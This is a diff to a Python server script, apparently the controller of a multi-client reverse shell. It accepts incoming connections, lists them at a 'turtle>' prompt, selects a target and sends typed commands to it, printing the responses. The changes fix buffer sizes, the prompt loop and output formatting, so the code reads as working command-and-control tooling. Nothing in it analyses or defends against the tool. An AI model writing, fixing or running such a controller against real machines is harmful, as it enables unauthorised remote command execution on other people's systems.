@@ -60,7 +60,7 @@ def accepting_connection():
             all_connections.append(conn)
             all_addresses.append(address)
 
-            print("Connection has been established | IP: " + address[0] + " | Port: " + str(address[1]))
+            print("Connection has been established | IP: " + address[0])  #  + " | Port: " + str(address[1])
             # handle_client_connection(conn, address)
         except:
             print("Error accepting connections")
@@ -70,9 +70,9 @@ def accepting_connection():
 # turtle> command
 # list = ID port
 
-def start_turtle():
-    cmd = input('turtle> ')
+def start_turtle():    
     while True:
+        cmd = input('turtle> ')
         if cmd == 'list':
             list_connections()
 
@@ -92,7 +92,7 @@ def list_connections():
     for i, conn in enumerate(all_connections):
         try:
             conn.send(str.encode(" "))
-            conn.recv(201480)
+            conn.recv(20480)
         except:
             del all_connections[i]
             del all_addresses[i]
@@ -100,7 +100,7 @@ def list_connections():
 
         results = str(i) + "  " + str(all_addresses[i][0]) + "  " + str(all_addresses[i][1]) + "\n"
 
-    print("----Clients----\n" + results)
+    print("----Clients----" + "\n" + results)
 
 # Get target client
 def get_target(cmd):
@@ -120,12 +120,12 @@ def send_target_commands(conn):
     while True:
         try:
             cmd = input("Command> ")
-            if cmd.lower() == "quit":
+            if cmd == "quit":
                 break
 
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
-                client_response = str(conn.recv(24080), "utf-8")
+                client_response = str(conn.recv(20480), "utf-8")
                 print(client_response, end="")
         except:
             print("Error sending command")
